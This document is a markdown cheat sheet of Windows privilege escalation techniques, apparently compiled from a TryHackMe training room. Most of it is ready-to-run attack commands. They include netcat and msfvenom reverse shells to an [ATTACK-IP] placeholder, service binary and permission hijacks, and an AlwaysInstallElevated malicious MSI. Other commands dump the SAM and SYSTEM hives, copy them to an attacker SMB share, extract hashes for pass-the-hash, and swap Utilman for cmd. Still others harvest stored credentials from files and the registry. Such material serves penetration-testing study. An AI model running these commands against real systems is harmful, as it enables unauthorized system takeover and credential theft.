# Windows Privilege Escalation

* [Unattended Windows Installations](#unattended-windows-installations)
* [Powershell History](#powershell-history)
* [Saved Windows Credentials](#saved-windows-credentials)
* [Internet Information Services Configuration](#internet-information-services-configuration)
* [Retrieve Credentials from PuTTY](#retrieve-credentials-from-putty)
* [Scheduled Tasks](#scheduled-tasks)
* [AlwaysInstallElevated](#alwaysinstallelevated)
* [Insecure Permissions on Service Executable](#insecure-permissions-on-service-executable)
* [Unquoted Service Paths](#unquoted-service-paths)
* [Insecure Service Permissions](#insecure-service-permissions)
* [SeBackup and SeRestore](#sebackup-and-serestore)
* [SeTakeOwnership](#setakeownership)
* [Tools of the Trade](#tools-of-the-trade)
* [Look for the password Keyword in the Registry](#look-for-the-password-keyword-in-the-registry)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Unattended Windows Installations

Check these locations for credentials:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

********************************************

## Powershell History
From Command Prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
From PowerShell:
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
PowerShell Command History File Location:
```
C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

********************************************

## Saved Windows Credentials

List saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option:
```
runas /savecred /user:admin cmd.exe
```

********************************************

## Internet Information Services Configuration
* (ISS)

Can find "web.config" in one of the following locations:
```
C:\inetpub\wwwroot\web.config
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

********************************************

## Retrieve Credentials from PuTTY

Search under the following registry key for ProxyPassword:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

********************************************

## Scheduled Tasks

List scheduled tasks with this command:
```
schtasks
```
* Look for "Task to Run" and "Run as User"
* Look at file executable permissions with:
```
icacls [FILE-PATH]
```
* Look for (F) in BUILTIN\Users
* Echo payload into file example:
```
echo c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT] > C:\tasks\schtask.bat
```
* Start a listener on attack machine
* Run the task:
```
schtasks /run /tn [TASK-NAME]
```
Check to see if the reverse shell connected

********************************************

## AlwaysInstallElevated

This method requires two registry values to be set. You can query these from the command line using the commands below:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[ATTACK-PORT] -f msi -o malicious.msi
```
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

********************************************

## Insecure Permissions on Service Executable

Query service configuration with:
```
sc qc [SERVICE-NAME]
```
Note the BINARY_PATH_NAME and check the file permissions with:
```
icacls [BINARY-PATH-NAME]
```
* Look for (F)ull or (M)odify rights in various groups
* Create payload with:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
```
* Transfer the file to target machine and start a listener on attack machine
* Restart the insecure service:
```
sc stop [SERVICE-NAME]
```
```
sc start [SERVICE-NAME]
```
* There should be a shell on the attack machine
* Note: PowerShell has "sc" as an alias to "Set-Content", therefore you need to use "sc.exe" in order to control services with PowerShell this way.

********************************************

## Unquoted Service Paths

If there is is a program installed on the machine in a folder that is world writable (not "Program Files" or "x86 Program Files"), and it has spaces and not quoted when running "sc.exe qc [PROGRAM-FILE-PATH]" , you can create a malicious payload under a new executable with a shorter name and it will run when the longer name program runs. For example: if there is a program called "Disk Shorter.exe" (unquoted), you can create a new executable called "Disk.exe" and it will run when "Disk Shorter.exe" is called. use the same msfvenom command as above to generate a malicious payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
```

********************************************

## Insecure Service Permissions

* Use Accesschk from the Sysinternals suite to check for a service's DACL: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
* Check the "BUILTIN\Users" group for "SERVICE_ALL_ACCESS" permission
* If the "SERVICE_ALL_ACCESS" permission exists, start a listener and create a malicious payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
```
* Transfer the malicious payload to the target machine and grant full control to everyone:
```
icacls [MALICIOUS-PAYLOAD-PATH] /grant Everyone:F
```
* Change the service's associated executable and account with:
```
sc config [VULNERABLE-SERVICE] binPath= "[MALICIOUS-PAYLOAD-PATH" obj= LocalSystem
```
```
sc stop [VULNERABLE-SERVICE]
```
```
sc start [VULNERABLE-SERVICE]
```
* A shell should spawn on the attack machine

********************************************

## SeBackup and SeRestore

* Check privileges with this command:
```
whoami /priv
```
* Ensure SeChangeNotifyPrivilege is Enabled
* To backup the SAM and SYSTEM hashes, we can use the following commands:
```
reg save hklm\system C:\Users\[USERNAME]\system.hive
```
```
reg save hklm\sam C:\Users\[USERNAME]\sam.hive
```
This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
```
mkdir share
```
```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username [USERNAME] -password [PASSWORD] public share
```
This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
```
copy C:\Users\[USERNAME]\sam.hive \\[ATTACK-IP]\public\
```
```
copy C:\Users\[USERNAME]\system.hive \\[ATTACK-IP]\public\
```
And use impacket to retrieve the users' password hashes:
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
```
python3.9 /opt/impacket/examples/psexec.py -hashes
```

********************************************

## SeTakeOwnership

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial. To replace utilman, we will start by taking ownership of it with the following command:
```
takeown /f C:\Windows\System32\Utilman.exe
```
Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
After this, we will replace utilman.exe with a copy of cmd.exe:
```
copy cmd.exe utilman.exe
```
To trigger utilman, lock the screen from the start button and proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges

********************************************

## Tools of the Trade

* Check for unpatched vulnerable software
* WinPEAS
   * Download: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
* PrivescCheck
   * Download: https://github.com/itm4n/PrivescCheck
* WES-NG: Windows Exploit Suggester - Next Generation
   * Download: https://github.com/bitsadmin/wesng
* Metasploit
   * If you already have a Meterpreter shell on the target system, you can use the "multi/recon/local_exploit_suggester" module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

********************************************

## Look for the password Keyword in the Registry

```
c:\Users\[USER]> reg query HKLM /f password /t REG_SZ /s
```
OR
```
C:\Users\[USER]> reg query HKCU /f password /t REG_SZ /s
```

### Reference:
* https://tryhackme.com/room/windowsprivesc20
